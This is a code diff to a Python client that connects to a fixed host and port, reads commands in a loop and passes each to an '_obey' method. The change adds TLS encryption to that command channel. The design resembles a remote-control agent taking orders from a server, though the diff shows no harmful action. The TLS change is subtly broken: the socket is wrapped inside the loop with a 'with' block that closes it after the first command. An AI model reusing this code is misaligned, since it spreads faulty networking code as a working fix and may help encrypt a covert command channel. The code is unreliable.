@@ -1,6 +1,7 @@
 import socket
 import logging
 import os
+import ssl
 import sys
 import threading
 import time
@@ -26,6 +27,7 @@ class Client:
         self.host = HOST
         self.port = PORT
         self.socket = socket.socket()
+        self.context = ssl.create_default_context()
 
     def start(self):
         self._connect()
@@ -36,9 +38,10 @@ class Client:
 
     def read_commands(self):
         while True:
-            command = self.socket.recv(1024)
-            logger.debug(f"Received {command}")
-            self._obey(command)
+            with self.context.wrap_socket(self.socket, server_hostname=self.host) as secure_socket:
+                command = secure_socket.recv(1024)
+                logger.debug(f"Received {command}")
+                self._obey(command)
 
     def _obey(self, command):
         succeeded = 1
